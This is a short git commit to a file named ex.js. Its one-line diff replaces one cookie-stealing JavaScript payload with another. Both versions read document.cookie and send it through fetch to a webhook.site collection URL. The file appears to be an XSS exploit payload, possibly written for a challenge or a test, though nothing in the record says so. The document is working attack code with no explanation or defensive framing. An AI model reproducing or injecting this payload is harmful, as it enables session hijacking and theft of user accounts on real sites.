eb122904372ad15538a4cba183de0970b797c8f4
Hoài Nam Nguyễn <63337624+hoainam125@users.noreply.github.com>
2024-07-01 20:14:12 +0700

    Update ex.js

--- ex.js
+++ ex.js
@@ -1,1 +1,1 @@
-cookie = document.cookie; fetch('https://webhook.site/81b160a0-e5aa-4bba-8c1c-72d5820ba26b/?c='+cookie);
+fetch('https://webhook.site/81b160a0-e5aa-4bba-8c1c-72d5820ba26b/?c='+document.cookie);
